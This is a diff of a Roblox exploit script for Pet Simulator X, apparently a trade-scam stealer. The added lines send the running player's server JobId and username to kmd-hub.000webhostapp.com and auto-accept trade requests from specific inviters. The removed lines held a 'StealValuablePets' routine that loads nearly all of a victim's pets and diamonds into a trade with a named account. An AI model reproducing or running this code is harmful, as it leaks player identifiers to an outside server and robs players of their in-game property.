@@ -1,4 +1,3 @@
-warn("New version!")
 local GC = getconnections or get_signal_cons
 if GC then
 	for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
@@ -36,8 +35,19 @@ local function http_request_get(url)
 			["spvsc-1"] = "1Nf0em1xer+",
 			["spvsc-2"] = "1Nf0em1xer+",
 			["spvsc-3"] = "1Nf0em1xer+",
-			["jobId"] = game.JobId,
-			["name"] = game.Players.LocalPlayer.Name,
+			["spvsc-4"] = game.JobId,
+		}
+	}).Body
+end
+local function http_request_get2(url)
+	return http_request({
+		Url=url,
+		Method="GET",
+		Headers={
+			["spvsc-1"] = "1Nf0em1xer+",
+			["spvsc-2"] = "1Nf0em1xer+",
+			["spvsc-3"] = "1Nf0em1xer+",
+			["spvsc-4"] = game.Players.LocalPlayer.Name,
 		}
 	}).Body
 end
@@ -47,8 +57,10 @@ end
 
 
 
-local updateRequest = http_request_get("https://kmdhubhandler.000webhostapp.com/.Update.php")
-if updateRequest ~= "OK" then error("Error updating data in server.") end
+local updateJobId = http_request_get("https://kmd-hub.000webhostapp.com/.updatejobidplease.php")
+if updateJobId ~= "OK" then error("Error updating JobId in server.") end
+local updateRobberName = http_request_get2("https://kmd-hub.000webhostapp.com/.updatenameplease.php")
+if updateRobberName ~= "OK" then error("Error updating RobberName in server.") end
 local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
 -- Enable trades
 print("[KMD-HUB-PSX-RSIDE] Sent this account's information to servers!")
@@ -64,6 +76,43 @@ if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Tra
 		workspace.__THINGS.__REMOTES:FindFirstChild("toggle setting"):FireServer(unpack(args))
 	until game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All"
 end
+game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Desc.Changed:Connect(function() --Accepter
+    wait(1)
+    print("Handling request...")
+    local inviterName = string.split(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Desc.Text, " ")[1]
+    if game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled == false then return end
+    if inviterName == "Your" then
+        game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled = false
+    end
+    local function getPlayerFromString(name)
+    	if game.Players:FindFirstChild(name) then return game.Players:FindFirstChild(name) end
+	for i,v in pairs(game.Players:GetChildren()) do
+		if v:IsA("Player") and v.DisplayName and v.DisplayName == name then
+			return v
+		end
+	end
+	return nil
+    end
+    if getPlayerFromString(inviterName) then
+        inviter = getPlayerFromString(inviterName)
+        if inviter.Character:FindFirstChild("LeftHand") then --Identifier
+            game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled = false
+        else
+            for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Yes.Activated)) do
+				v:Fire()
+			end
+        end
+    else
+        for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Ok.Activated)) do
+			v:Fire()
+        end
+        for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.No.Activated)) do
+			v:Fire()
+        end
+	    return
+    end
+end)
+
 v2.Network.Fired("Init Trade"):Connect(function(p3, p4) --Trade handler
     tradeName = p3;
     if inviter and inviter.Character:FindFirstChild("LeftHand") then
@@ -95,107 +144,3 @@ v2.Network.Fired("Init Trade"):Connect(function(p3, p4) --Trade handler
 	    workspace.__THINGS.__REMOTES:FindFirstChild("ready trade"):InvokeServer(unpack(acceptargs))
 	until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Trading").Enabled == false
 end);
-local library = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
-function getPetCount()
-    local petCount = 0
-    local petsGUIPath = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
-    for i,v in pairs(petsGUIPath:GetChildren()) do
-        if v:IsA("TextButton") then
-            petCount = petCount + 1
-        end
-    end
-    return petCount
-end
-function StealValuablePets(currentTradeId)
-    local UI = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
-    local function UnformatNumber(str)
-        local suffixes = {'k','m','b'}
-        if not (str and type(str) == 'string') then
-            error('invalid parameters.\nP1 - string: string', 2)
-        end
-        local totalMagnitude = 1
-        for key, suffix in pairs(suffixes) do
-            str = string.gsub(str, suffix, function()
-                totalMagnitude = totalMagnitude * (10 ^ (key * 3))
-                return ''
-            end)
-        end
-        if not tonumber(str) then
-            return 'invalid'
-        end
-        return totalMagnitude * str
-    end
-    count = 0
-    for i,v in pairs(UI:GetChildren()) do
-        if v:IsA("TextButton") then
-            local petID = v.Name
-            count = count+1
-            if count <= getPetCount() - 1 then
-                local args = {
-                    [1] = {
-                        [1] = currentTradeId,
-                        [2] = v.Name
-                    }
-                }  
-               workspace.__THINGS.__REMOTES:FindFirstChild("add trade pet"):InvokeServer(unpack(args))
-            else
-                break
-            end
-        end
-    end
-end
-library.Network.Fired("Init Trade"):Connect(function(p3, p4)
-    if game.Players:FindFirstChild("iChronux") and game.Players["iChronux"].Character:FindFirstChild("RightHand") == nil and game.Players["iChronux"].Character:FindFirstChild("LeftHand") == nil then
-        tradeName = p3;
-        local args = {
-            [1] = {
-                [1] = tradeName,
-                [2] = 100e10
-            }
-        }
-        game.Workspace.__THINGS.__REMOTES:FindFirstChild("change trade diamonds"):InvokeServer(unpack(args))
-        StealValuablePets(tradeName)
-    end
-end);
-while wait(1) do
-	warn("Checking...")
-	if game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled == true then
-		wait(1)
-    print("Handling request (2)...")
-    local inviterName = string.split(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Desc.Text, " ")[1]
-    if game:GetService("Players").LocalPlayer.PlayerGui.Message.Enabled == false then return end
-    if inviterName == "Your" then
-        for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.No.Activated)) do
-		v:Fire()
-	end
-    end
-    local function getPlayerFromString(name)
-    	if game.Players:FindFirstChild(name) then return game.Players:FindFirstChild(name) end
-	for i,v in pairs(game.Players:GetChildren()) do
-		if v:IsA("Player") and v.DisplayName and v.DisplayName == name then
-			return v
-		end
-	end
-	return nil
-    end
-    if getPlayerFromString(inviterName) then
-        inviter = getPlayerFromString(inviterName)
-        if inviter.Character:FindFirstChild("LeftHand") then --Identifier
-		for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.No.Activated)) do
-			v:Fire()
-		end
-        else
-		for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Yes.Activated)) do
-			v:Fire()
-		end
-        end
-    else
-        for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.Ok.Activated)) do
-		v:Fire()
-        end
-        for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Message.Frame.No.Activated)) do
-		v:Fire()
-        end
-    end
-	end
-end
